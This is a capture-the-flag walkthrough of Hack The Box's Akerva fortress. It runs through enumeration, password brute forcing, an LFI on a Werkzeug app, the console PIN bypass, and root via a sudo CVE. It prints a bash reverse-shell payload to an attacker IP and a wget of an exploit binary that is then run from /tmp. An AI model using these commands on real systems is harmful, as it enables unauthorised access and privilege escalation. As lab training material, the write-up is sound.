@@ -1,0 +1,217 @@
+=================================================================================================
+												******** HTB - CBBH Exam Prep: Akerva ********
+==================================================================================================
+-- About Akerva:
+================
+This fun fortress from Akerva features a gradual learning curve. It teaches about common developer 
+mistakes while also introducing a very interesting web vector. Prepare to take your skills to the 
+next level!
+
+Firstly I eported the IP as an env variable and ran an 'nmap' port scan on all ports on the target 
+machine.
+
+** export IP=10.10.11.225
+** nmap -n -Pn -p- $IP --open
+
+Nmap scan report for 10.13.37.11
+PORT     STATE SERVICE
+
+22/tcp   open  ssh
+80/tcp   open  http
+5000/tcp open  upnp
+
+** nmap -n -Pn -p 80,22,5000 -sC -sV $IP
+
+Nmap scan report for 10.13.37.11
+Host is up (0.11s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 0d:e4:41:fd:9f:a9:07:4d:25:b4:bd:5d:26:cc:4f:da (RSA)
+|   256 f7:65:51:e0:39:37:2c:81:7f:b5:55:bd:63:9c:82:b5 (ECDSA)
+|_  256 28:61:d3:5a:b9:39:f2:5b:d7:10:5a:67:ee:81:a8:5e (ED25519)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: WordPress 5.4-alpha-47225
+|_http-title: Root of the Universe &#8211; by @lydericlefebvre &amp; @akerva_fr
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
+| http-auth: 
+| HTTP/1.0 401 UNAUTHORIZED\x0D
+|_  Basic realm=Authentication Required
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+=================================================================================================
+-- Host enumeration:
+====================
+OS: Linux Ubuntu
+Web app technology: Python (Werkzeug)
+Web server technology: Apache 2.429
+Web app CMS technology: Wordpress 5.4-alpha ==> Theme: twentyfifteen 3.7.0
+
+-- Users:
+** aas
+
+-- Valid web app directory:
+** /var/www/html/scripts/backup_every_17minutes.sh
+** /var/www/html/dev/space-dev.py
+
+-- SNMP enumeration:
+====================
+[*] System information:
+
+  Host IP address               : 10.13.37.11
+  Hostname                      : Leakage
+  Description                   : Linux Leakage 4.15.0-72-generic #81-Ubuntu SMP Tue Nov x86_64
+
+[*] Network IP:
+
+  Id                    IP Address            Netmask               Broadcast           
+  2                     10.13.37.11           255.255.255.0         1                   
+  1                     127.0.0.1             255.0.0.0             0                   
+
+[*] Routing information:
+
+  Destination           Next hop              Mask                  Metric              
+  0.0.0.0               10.13.37.2            0.0.0.0               1                   
+  10.13.37.0            0.0.0.0               255.255.255.0         0                   
+
+[*] Listening UDP ports:
+
+  Local address         Local port          
+  0.0.0.0               161                 
+  0.0.0.0               49160               
+  127.0.0.53            53 
+
+=================================================================================================
+-- Exploitation walkthrough:
+============================
+From th einitial nmap scan we see that we have an ssh and two web app servrs. Since we have not valid 
+user creds, I will focus on the weserver on port 80 first.
+
+On manual inspection, I could see some coments in the source page. In it i see that the website is 
+using wordpress theme 2015 and i also got the first flag in the comments section.
+
+Next, I used the wpscan for to scan the website on port 80 since it is using a wordpress CMS solution
+
+The wpscan used is as seen below:
+ 
+** wpscan --url  http://10.13.37.11/ --enumerate ap,at,cb,dbe,u
+
+From here I confirmed the theme in use and also got a valid user which I did a password bruteforce 
+attck on with the below command but no luck.
+
+** wpscan --password-attack wp-login -t 20 -U aas -P /usr/share/wordlists/rockyou.txt --url http://10.13.37.11/
+
+I tried to access the xmlrpc.php service by gettig all allowed methods and got an error response thus
+I knew it is not exploitable.
+
+Then from public sources (googling), I did an SNMP enumeration on the host with the below command
+
+** snmp-check -c public -v 2c 10.13.37.11 -d
+
+This reealed a lot of infor about the host. If I had not looked at the walkthorugh, I would have been
+stuck on this host for a long time.
+
+From the SNMP enum, I got to know the web app folder, saw some scripts being run, and also got a flag
+from the output too.
+
+One if the file path is saw was '/var/www/html/scripts/backup_every_17minutes.sh' doing a get request
+returned an error but chaning the request to a POST, made me download this script.
+
+** curl -X POST 'http://10.13.37.11/scripts/backup_every_17minutes.sh'
+
+On viewing the script, I could see the file name where the script was being bakcup to. The script backs
+up every 17 minutes or 1020 secs.
+
+To predit this filename I create a series of numbers for the minute and second part and got the year,
+month, day, and hour from sending a curl request to get the header and read the current time on the web
+server.
+
+** curl -I http://10.13.37.11
+
+To generate wordlist for the minute and second part of the filename, i used the below crunch command 
+and used burp intruder or wfuzz to get the right filename and then download it.
+
+** crunch 4 4 0123456789 -o wordlist.txt
+** export URL=http://$IP/backups/backup_2023082916FUZZ.zip
+** wfuzz -c -z file,/home/demola/wordlist.txt --hc 404 --hl 0 "$URL" 
+** http://10.13.37.11/backups/backup_20230829162012.zip
+
+After unzipping this file and reading it, I could see that there are two file paths '/file' and
+'/download'. The file path had a filaname query param that was vuln to LFI as seen below.
+
+** view-source:http://10.13.37.11:5000/file?filename=/etc/passwd
+** aas:x:1000:1000:Lyderic Lefebvre:/home/aas:/bin/bash
+
+Exploiting the LFI by reading the passwd file, I could reconfirm that aas was a valid user.
+
+Next I did a directory fuzzing attack on the web app on port 5000 as this was where the LFI existed.
+
+** wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 --hl 0 -b "Authorization=Basic YWFzOkFLRVJWQXsxa24wd19IMHdfVE9fJENyMXBfVF8kJCQkJCQkJH0=" "$URL"
+
+Also since this is a 'Werkzeug' app, it was worth cheking for the '/console' path to see if it was 
+accessible. The command above also gave the '/console' path in its output.
+
+On accessing the /console path, it was protected by requestig a pin to access the console. Doing a 
+search onlie, for the Werkzeug console pin bypass exploit, i got the below link:
+
+** https://www.daehee.com/werkzeug-console-pin-exploit/
+** https://werkzeug.palletsprojects.com/en/1.0.x/debug/
+
+Bypassing the pin protected console, you need an LFI cos for the script we will use, we need to get the
+MAC address and the via the machine ID reading the files below via th eLFI vuln
+
+** /sys/class/net/ens33/address and /etc/machine-id
+** print(0xAMC_Addr)			Remeber to convert the mac address to integer.
+
+Once we generate the PIN and bypass the protection, we execute a reverse shell to our attacking machine
+with the below command.
+
+** nc -lnvp 4243
+** __import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.13/4243 0>&1"').read()
+
+Once we get a rev shell, We try to escalate our priv and also get other flags in the aas's home folder
+
+The sudo version on the machine is vuln to escalate priv. by checking the version, I was able to find
+the exploit for it.
+
+** sudo --version
+** Serach for sudo exploit for version 1.8.21p2
+** https://github.com/saleemrashid/sudo-cve-2019-18634/
+** gcc -o sudo sudo.c
+** python3 -m http.server 8000
+** wget http://10.10.14.20:8000/sudo -O /tmp/slam
+** ./slam
+
+Finally in the root's home folder, I could see a secured_note.md file. Decoding this in base64 produced
+a string of random characters.
+
+This looked like a cipher. I needed to know what alphabets were missing so used a script in python to 
+check it for me.
+
+import string
+def check(char):
+        s = "GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE" 
+        if(char.upper() in s):
+                pass
+        else:
+                print char.upper()
+
+alphabets = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+for c in alphabets:
+        check(c)
+
+From the output of the above script, letters 'B,J,Q,X,Z' are missing and then i used the below link:
+
+** https://www.dcode.fr/vigenere-cipher
+** KEy: ILOVESPACE
+
+This decoded it to give a series of strings that i need to added spaces inbetween them to make sense.
+
+Decrypted: WELLDONE FOR SOLVING THIS CHALLENGE YOU CAN SEND YOUR RESUME HERE AT RECRUTEMENT AKERVA COM 
+AND VALIDATE THE LAST FLAG WITH AKERVA{IKNOOOWVIGEEENERRRE}
+
+
